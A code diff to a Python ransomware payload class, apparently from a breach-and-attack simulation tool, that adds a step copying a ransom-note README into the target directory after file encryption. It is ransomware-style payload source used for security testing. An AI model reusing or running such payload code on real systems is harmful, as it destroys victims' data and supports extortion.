@@ -1,4 +1,5 @@
 import logging
+import shutil
 from pathlib import Path
 from typing import List, Optional, Tuple
 
@@ -13,6 +14,9 @@ LOG = logging.getLogger(__name__)
 
 EXTENSION = ".m0nk3y"
 CHUNK_SIZE = 4096 * 24
+
+README_SRC = Path(__file__).parent / "ransomware_readme.txt"
+README_DEST = "README.txt"
 
 
 class RansomewarePayload:
@@ -29,6 +33,9 @@ class RansomewarePayload:
             else target_directories["linux_dir"]
         )
 
+        self._readme_enabled = config["other_behaviors"]["readme"]
+        LOG.info(f"README enabled: {self._readme_enabled}")
+
         self._new_file_extension = EXTENSION
         self._valid_file_extensions_for_encryption = VALID_FILE_EXTENSIONS_FOR_ENCRYPTION.copy()
         self._valid_file_extensions_for_encryption.discard(self._new_file_extension)
@@ -39,6 +46,7 @@ class RansomewarePayload:
     def run_payload(self):
         file_list = self._find_files()
         self._encrypt_files(file_list)
+        self._leave_readme()
 
     def _find_files(self) -> List[Path]:
         if not self._target_dir:
@@ -67,3 +75,10 @@ class RansomewarePayload:
     def _send_telemetry(self, filepath: Path, error: str):
         encryption_attempt = RansomwareTelem((str(filepath), str(error)))
         self._telemetry_messenger.send_telemetry(encryption_attempt)
+
+    def _leave_readme(self):
+        if self._readme_enabled:
+            try:
+                shutil.copyfile(README_SRC, Path(self._target_dir) / README_DEST)
+            except Exception as ex:
+                LOG.warning(f"An error occurred while attempting to leave a README.txt file: {ex}")
